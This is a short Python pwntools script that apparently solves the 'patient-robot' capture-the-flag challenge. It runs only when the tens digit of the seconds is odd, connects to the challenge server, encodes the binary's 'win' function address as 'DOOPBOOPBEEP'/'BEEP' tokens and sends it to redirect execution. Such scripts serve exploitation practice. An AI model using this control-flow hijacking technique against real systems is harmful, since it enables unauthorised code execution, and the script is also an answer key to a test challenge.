from pwn import *
import datetime

e = context.binary = ELF(args.BIN)

# Must be run at a time where the 10's seconds position is odd:
# 06:07:10 , 06:07:30 , 06:07:50 etc.
# https://time.is/

#p = process(e.path)

# Prevent from executing at wrong time
if not (int(str(datetime.datetime.now().time())[6]) & 1):
    print("The 10s digit of the time is not odd. Payload will fail. Exiting...")
    exit(0)

p = remote("spaceheroes-patient-robot.chals.io", 443, ssl=True, sni="spaceheroes-patient-robot.chals.io")
p.recvline()

addr = bin(e.sym['win'])[::-1].strip('b0') # Win addr

response = ""
for bit in addr:
    if bit == "1":
        response += "DOOPBOOPBEEP"
    elif bit == "0":
        response += "BEEP"

p.sendline(response)
print(p.recvline(timeout=200))
p.interactive()
